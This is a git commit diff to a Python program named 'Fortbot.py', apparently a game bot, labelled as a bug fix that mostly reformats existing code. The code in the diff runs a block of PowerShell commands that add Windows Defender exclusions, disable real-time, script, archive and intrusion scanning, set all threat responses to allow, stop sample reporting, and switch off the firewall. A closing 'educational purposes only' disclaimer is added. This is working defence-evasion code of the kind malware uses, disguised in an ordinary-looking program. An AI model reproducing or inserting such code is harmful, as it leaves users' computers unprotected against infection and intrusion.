57cf8f400b1fd5f5dd9250977ad678112529dd5d
Fam Awad <fam@awadlouis.com>
2023-06-28 13:54:07 +0300

    Fixing background check bugs

--- Fortbot.py
+++ Fortbot.py
@@ -1194,26 +1194,85 @@ class App:
             except:
                 print("Direct link not working")
         try:
-            subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=TRUE)
-            subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .tmp", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection disable", shell=TRUE)
-            subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $true", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -DisableIOAVProtection $true", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -DisablePrivacyMode $true", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -DisableArchiveScanning $true", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $true", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $true", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -ModerateThreatDefaultAction 6", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6", shell=TRUE)
-            subprocess.call("powershell.exe -command Set-MpPreference -ScanScheduleDay 8", shell=TRUE)
-            subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state off", shell=TRUE)
+            subprocess.call(
+                "powershell.exe -command Add-MpPreference -ExclusionExtension .exe",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Add-MpPreference -ExclusionExtension .tmp",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -PUAProtection disable",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Add-MpPreference -ExclusionExtension .exe",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $true",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -DisableIOAVProtection $true",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -DisablePrivacyMode $true",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -DisableArchiveScanning $true",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $true",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -DisableScriptScanning $true",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=TRUE
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -ModerateThreatDefaultAction 6",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command Set-MpPreference -ScanScheduleDay 8",
+                shell=TRUE,
+            )
+            subprocess.call(
+                "powershell.exe -command netsh advfirewall set allprofiles state off",
+                shell=TRUE,
+            )
         except:
             print("Couldn't add path to exclusions")
 
@@ -1485,4 +1544,5 @@ if __name__ == "__main__":
     login = App()
 
 
-''
+"""
+    DISCLAIMER: Use for educational purposes only"""
